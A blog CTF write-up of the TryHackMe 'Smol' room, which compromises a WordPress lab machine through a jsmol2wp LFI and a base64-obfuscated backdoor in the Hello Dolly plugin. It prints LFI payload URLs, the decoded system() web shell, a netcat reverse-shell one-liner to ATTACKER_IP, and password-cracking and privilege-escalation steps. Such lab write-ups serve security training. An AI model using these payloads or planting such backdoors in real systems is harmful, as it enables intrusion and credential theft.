---
title: "Writeup: TryHackMe Smol"
date: "2025-02-21T20:12:59.577Z"
slug: "writeup-tryhackme-smol"
categories:
    - "writeups"
    - "it"
---

> [!info]
> - [Smol](https://tryhackme.com/r/room/smol)
> - Difficulty: medium
> - Platform: web, linux
>
> At the heart of Smol is a WordPress website, a common target due to its extensive plugin ecosystem. The machine showcases a publicly known vulnerable plugin, highlighting the risks of neglecting software updates and security patches. Enhancing the learning experience, Smol introduces a backdoored plugin, emphasizing the significance of meticulous code inspection before integrating third-party components.
>
> Quick Tips: Do you know that on computers without GPU like the AttackBox, John The Ripper is faster than Hashcat?
>
> Answer the questions below
> 1. What is the user flag?
> 2. What is the root flag?

The fun part of this room was hopping from one user to another in order to get the root. Vulnerabilities explored were:

- Vulnerable components with LFI and RCE
- Password reuse
- Weak passwords
- User access misconfiguration (group access, PAM, sudoers)


{{< toc >}}

## Information gathering

From the description it looks like we need to find one vulnerable WordPress plugin and with its help find another one. Webpage source code links to JS file belonging to the plugin `jsmol2wp`:

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/JSmol.min.nojq.js?ver=14.1.7_2014.06.09
```

This plugin has LFI vulnerability [CVE-2018-20463](https://nvd.nist.gov/vuln/detail/CVE-2018-20463).

## Getting into the WordPress dashboard via LFI

I navigated to `http://www.smol.thm/wp-content/plugins/jsmol2wp/` to view plugin directory structure so that I could find the vulnerable file. To confirm the vulnerability:

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?query=php://filter/resource=file:///etc/passwd
...
think:x:1000:1000:,,,:/home/think:/bin/bash
fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
xavi:x:1001:1001::/home/xavi:/bin/bash
diego:x:1002:1002::/home/diego:/bin/bash
gege:x:1003:1003::/home/gege:/bin/bash
```

From there I lost time trying to pivot [LFI2RCE via PHP filters](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html) because I forgot about the second plugin. I wasn't able to make it work.

My next step after reading hacktricks was checking `wp-config.php` file. There is a database user and password.

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?query=php://filter/resource=../../../../wp-config.php
...
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'REDACTED' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );
```

I logged in with this user and password at `http://www.smol.thm/wp-login.php`

## Finding a backdoored plugin

There, in the dashboard, I saw a private page `Webmaster Tasks!!`. It mentions plugin `Hello Dolly`. Using previously found LFI vulnerability I got its code:

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?query=php://filter/resource=../../../plugins/hello.php
```

The code has a weird line:

```php
eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
```

Decoding it from base64:

```php
 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } 
```

Looks like a promised backdoor. Next, I decoded the parameter name:

```bash
$ php -r 'echo "\143\155\x64 \143\x6d\144";' 
cmd cmd
```

To confirm the backdoor I passed `cmd` query parameter in the dashboard so that result was shown on the page:

```
http://www.smol.thm/wp-admin/index.php?cmd=whoami
```

Having confirmed RCE, I started a reverse shell:

```
http://www.smol.thm/wp-admin/?cmd=rm %2Ftmp%2Ff%3Bmkfifo %2Ftmp%2Ff%3Bcat %2Ftmp%2Ff|%2Fbin%2Fbash -i 2>%261|nc ATTACKER_IP 443 >%2Ftmp%2Ff

```

Make sure to stabilize shell.

## Getting access to `diego` and user flag

Since I already knew database user and password, I connected to the database and got users table:

```
$ mysql -u wpuser -p

mysql> use wordpress;
mysql> select user_login, user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$REDACTED                        |
| wpuser     | $P$REDACTED                        |
| think      | $P$REDACTED                        |
| gege       | $P$REDACTED                        |
| diego      | $P$REDACTED                        |
| xavi       | $P$REDACTED                        |
+------------+------------------------------------+
```

John the Ripper with `rockyou` wordlist cracked a password for the user `diego`:

```bash
$ cat pass   
admin:$P$REDACTED
wpuser:$P$REDACTED
think:$P$REDACTED
gege:$P$REDACTED
diego:$P$REDACTED
xavi:$P$REDACTED

$ john -w=/usr/share/wordlists/rockyou.txt pass   
...

$ john --show pass
diego:REDACTED
```

In the current reverse shell I changed user to `diego` and got the flag:

```bash
$ su diego
$ cat /home/diego/user.txt
REDACTED
```


## Getting access to `think`

While exploring the system I was able to read private SSH key of the user `think`.

```bash
$ ls /home/think/.ssh
authorized_keys
id_rsa
id_rsa.pub
```

I copied it to the attack machine and logged in via SSH.

## Getting access to `gege`

Another interesting file I saw was `/home/gege/wordpress.old.zip` which I wasn't able to access.

Using [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) I didn't find anything except for its suggestion to try login as different users without a password. Which, surprisingly, worked: `su gege`. It did [because of PAM configuration](https://jaxafed.github.io/posts/tryhackme-smol/#shell-as-gege) in `/etc/pam.d/su`.

## Getting access to `xavi`

File `wordpress.old.zip` was password-protected. I copied it to the attack machine and ran John the Ripper again:

```bash
$ zip2john wordpress.old.zip > wp   
$ john -w=/usr/share/wordlists/rockyou.txt wp
...
$ john --show pass 
REDACTED    
```

After unzipping the archive I found another `wp-config.php` file:

```
define( 'DB_NAME' 'wordpress' );
define( 'DB_USER', 'xavi' );
define( 'DB_PASSWORD', 'REDACTED' )
define( 'DB_HOST', 'localhost' );  
```

Attempt to change user to `xavi` with this password was successful.

## Getting the root flag

Checking privileges for user `xavi` showed that they can run all commands with `sudo`:

```bash
$ sudo -l
[sudo] password for xavi: 
Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) ALL

```

Finally, the root flag:

```bash
$ sudo cat /root/root.txt
REDACTED
```
